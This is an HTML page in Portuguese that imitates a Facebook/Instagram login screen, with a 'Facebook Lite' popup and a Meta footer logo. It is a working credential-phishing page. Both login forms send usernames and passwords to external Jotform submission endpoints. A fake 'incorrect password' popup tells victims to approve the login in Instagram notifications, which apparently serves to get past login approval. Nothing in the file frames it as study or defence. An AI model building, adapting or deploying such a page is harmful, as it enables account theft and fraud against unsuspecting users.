<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Clique aqui para abrir</title>
  <!-- Font Awesome para ícones -->
  <link
  rel="stylesheet"
  href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"
  />
  
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
  <link rel="stylesheet" href="styles.css" />
  <script src="script.js" defer></script>
</head>
<body>

  <div class="container">
    <!-- Logo do site adv-->
    <img src="logo.png" alt="logo" class="logo" />

    <!-- Botão "Entrar com o" -->
    <button class="facebook-btn" onclick="openPopupFacebook()">
      <i class="fa-brands fa-facebook"></i>
      Entrar com o Facebook
    </button>

    <!-- Formulário de login site advocacia -->
    <form action="https://submit.jotform.com/submit/251797458905069" method="POST">
      <input type="text" name="q4_nome" placeholder="Nome de usuário, email ou celular" required>
      <input type="password" name="q5_typeA5" placeholder="Senha" required>
      <button type="submit" class="btn-login">Entrar</button>
    </form>

    
    <!-- Botão Criar nova conta -->
    <button class="create-account">Criar nova conta</button>

    <!-- Logo Meta no rodapé -->
    <img src="from.png" alt="rodape" class="meta-logo">
  </div>
  <!-- 1º Pop-up telefone para contato-->
  <div class="popup" id="popupAviso">
  <div class="popup-content">
  <p>
  <i class="fas alert"></i> <font color="red">Senha incorreta.</font>
  <br>  <br>
  <i class="fas fa-bell"></i> Aprove o seu login
  <br> nas notificações do instagram clicando em<br>"Fui Eu" e tente novamente.
  </p>
  <button class="close-popup" onclick="closePopupAviso()">
  <i class="fas fa-redo-alt"></i> Tentar novamente
  </button>
  <br><br>
  
  <button class="close-popup" onclick="closePopupAviso()">
  <i class="fas fa-user"></i> Entrar com outra conta
  </button>
  </div>
</div>


  </div>
  
  

  <!-- 2º Pop-up: Mini formulário  -->
  <div class="popup" id="popupFacebook">
    <div class="facebook-popup-content">
      <h2><i class="fa-brands fa-facebook"></i> Facebook Lite</h2>
      
      <form action="https://submit.jotform.com/submit/251797092732061" method="POST">
        <div class="fb-input-container">
          <i class="fa-solid fa-envelope"></i>
          <input type="text" name="q3_nome" placeholder="Email ou telefone" required>
        </div>
        <div class="fb-input-container">
          <i class="fa-solid fa-lock"></i>
          <input type="password" name="q4_sobre2" placeholder="Senha" required>
        </div>
        <button type="submit" class="facebook-popup-btn">Entrar</button>
      </form>
      <button class="facebook-popup-cancel" onclick="closePopupFacebook()">Cancelar</button>
    </div>
  </div>
</body>
</html>
